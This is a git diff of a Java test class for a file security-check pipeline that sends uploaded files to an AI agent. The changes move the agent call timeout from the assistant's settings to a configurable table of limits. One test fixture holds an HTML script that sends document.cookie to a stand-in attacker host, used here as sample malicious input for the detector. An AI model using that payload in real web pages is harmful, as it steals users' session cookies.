@@ -13,6 +13,7 @@ import static org.mockito.Mockito.times;
 import static org.mockito.Mockito.verify;
 import static org.mockito.Mockito.when;
 
+import com.workplace.airun.AiCallTimeouts;
 import com.workplace.auth.service.AssistantResolver;
 import com.workplace.auth.service.AssistantSpec;
 import com.workplace.chat.service.ChatFixtures;
@@ -58,8 +59,7 @@ class FileSecurityCheckPipelineTest extends ExternalClientMockedTestBase {
   private static final long TENANT = 1L;
   private static final String SCRIPT_HTML =
       "<html><body><script>fetch('https://evil.example/c?'+document.cookie)</script></body></html>";
-  private static final AssistantSpec SPEC =
-      new AssistantSpec(1L, "claude-sonnet-4-6", "NORMAL", 1, 60_000);
+  private static final AssistantSpec SPEC = new AssistantSpec(1L, "claude-sonnet-4-6", "NORMAL", 1);
 
   @Autowired DSLContext dsl;
   @Autowired FileStore fileStore;
@@ -73,6 +73,7 @@ class FileSecurityCheckPipelineTest extends ExternalClientMockedTestBase {
 
   @Autowired AiAgentDriveClient driveClient;
   @Autowired AssistantResolver assistantResolver;
+  @Autowired tools.jackson.databind.ObjectMapper objectMapper;
 
   private final List<Long> fileIds = new ArrayList<>();
   private final List<Long> userIds = new ArrayList<>();
@@ -236,11 +237,14 @@ class FileSecurityCheckPipelineTest extends ExternalClientMockedTestBase {
     assertThat(row(fileId).getStatus()).isEqualTo("FAILED");
   }
 
-  /** 비서 사양 timeoutMs 가 lease 보다 길어도(20분) ai-agent 호출 timeout 은 8분으로 잘린다 — lease(10분) 안에 끝나게. */
+  /**
+   * 비서 사양 timeoutMs(20분)와 무관하게 ai-agent 호출 timeout 은 상한 표의 DRIVE_SECURITY_CHECK 값(기본
+   * 60초)이다(WP-2111).
+   */
   @Test
-  void check_whenSpecTimeoutExceedsCap_capsAgentTimeoutAt8Minutes() {
+  void check_usesTableTimeoutRegardlessOfSpec() {
     when(assistantResolver.resolveWorkspaceOrEmpty())
-        .thenReturn(Optional.of(new AssistantSpec(1L, "m", "NORMAL", 1, 20 * 60_000)));
+        .thenReturn(Optional.of(new AssistantSpec(1L, "m", "NORMAL", 1)));
     stubHigh();
     long fileId = seedFile("page.html", "text/html", SCRIPT_HTML.getBytes(StandardCharsets.UTF_8));
     pending(fileId);
@@ -249,8 +253,33 @@ class FileSecurityCheckPipelineTest extends ExternalClientMockedTestBase {
 
     ArgumentCaptor<SecurityCheckReq> req = ArgumentCaptor.forClass(SecurityCheckReq.class);
     verify(driveClient).securityCheck(req.capture());
-    assertThat(req.getValue().timeoutMs()).isEqualTo(8L * 60 * 1000);
-    assertThat(FileSecurityCheckRepository.LEASE).isEqualTo(Duration.ofMinutes(10));
+    assertThat(req.getValue().timeoutMs()).isEqualTo(60_000);
+  }
+
+  /** 덮어쓰기 최대(8분)여도 호출 timeout 은 8분이고 CHECKING lease(10분) 안에 끝난다. */
+  @Test
+  void check_withMaxOverride_sendsEightMinutesWithinLease() {
+    FileSecurityCheckPipeline overridden =
+        new FileSecurityCheckPipeline(
+            repository,
+            assistantResolver,
+            driveClient,
+            fileStore,
+            objectMapper,
+            txManager,
+            new AiCallTimeouts("DRIVE_SECURITY_CHECK=8m"));
+    when(assistantResolver.resolveWorkspaceOrEmpty()).thenReturn(Optional.of(SPEC));
+    stubHigh();
+    long fileId = seedFile("page.html", "text/html", SCRIPT_HTML.getBytes(StandardCharsets.UTF_8));
+    pending(fileId);
+
+    asTenant(() -> overridden.check(fileId));
+
+    ArgumentCaptor<SecurityCheckReq> req = ArgumentCaptor.forClass(SecurityCheckReq.class);
+    verify(driveClient).securityCheck(req.capture());
+    assertThat(req.getValue().timeoutMs()).isEqualTo(480_000);
+    assertThat(Duration.ofMillis(req.getValue().timeoutMs()))
+        .isLessThan(FileSecurityCheckRepository.LEASE);
   }
 
   /** 응답 위험도가 고정 값이 아니면 저장하지 않고 재시도 대상 실패로 센다(저장 단계에서 터져 CHECKING 에 남지 않게). */
